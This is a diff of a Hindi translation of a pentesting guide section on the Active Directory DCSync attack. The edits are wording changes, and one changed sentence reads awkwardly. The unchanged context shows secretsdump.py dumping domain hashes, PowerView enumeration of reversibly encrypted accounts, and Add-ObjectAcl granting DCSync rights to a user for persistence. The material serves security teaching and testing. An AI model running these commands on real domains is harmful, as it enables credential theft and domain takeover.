@@ -4,7 +4,7 @@
 
 ## DCSync
 
-**DCSync** अनुमति का अर्थ है कि डोमेन पर ये अनुमतियाँ होनी चाहिए: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** और **Replicating Directory Changes In Filtered Set**।
+**DCSync** अनुमति का अर्थ है कि डोमेन पर ये अनुमतियाँ हैं: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** और **Replicating Directory Changes In Filtered Set**।
 
 **DCSync के बारे में महत्वपूर्ण नोट्स:**
 
@@ -33,7 +33,7 @@ secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 
 - एक **NTLM हैश** के साथ
 - एक **Kerberos कुंजी** के साथ
-- एक स्पष्ट पाठ पासवर्ड के साथ NTDS से किसी भी खाते के लिए जिसमें [**पुनरावर्ती एन्क्रिप्शन**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) सक्षम है। आप पुनरावर्ती एन्क्रिप्शन वाले उपयोगकर्ताओं को प्राप्त कर सकते हैं
+- एक स्पष्ट पाठ पासवर्ड के साथ NTDS से किसी भी खाते के लिए जिसमें [**पुनरावृत्त एन्क्रिप्शन**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) सक्षम है। आप पुनरावृत्त एन्क्रिप्शन वाले उपयोगकर्ताओं को प्राप्त कर सकते हैं
 
 ```powershell
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
@@ -45,7 +45,7 @@ Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD
 ```powershell
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
 ```
-फिर, आप **जांच सकते हैं कि उपयोगकर्ता को 3 विशेषाधिकार सही ढंग से सौंपे गए थे** (आपको "ObjectType" फ़ील्ड के अंदर विशेषाधिकारों के नाम देखने में सक्षम होना चाहिए):
+फिर, आप **जांच सकते हैं कि उपयोगकर्ता को 3 विशेषाधिकार सही ढंग से सौंपे गए थे** उन्हें (आपको "ObjectType" फ़ील्ड के अंदर विशेषाधिकारों के नाम देखने में सक्षम होना चाहिए) के आउटपुट में खोजकर:
 ```powershell
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
 ```
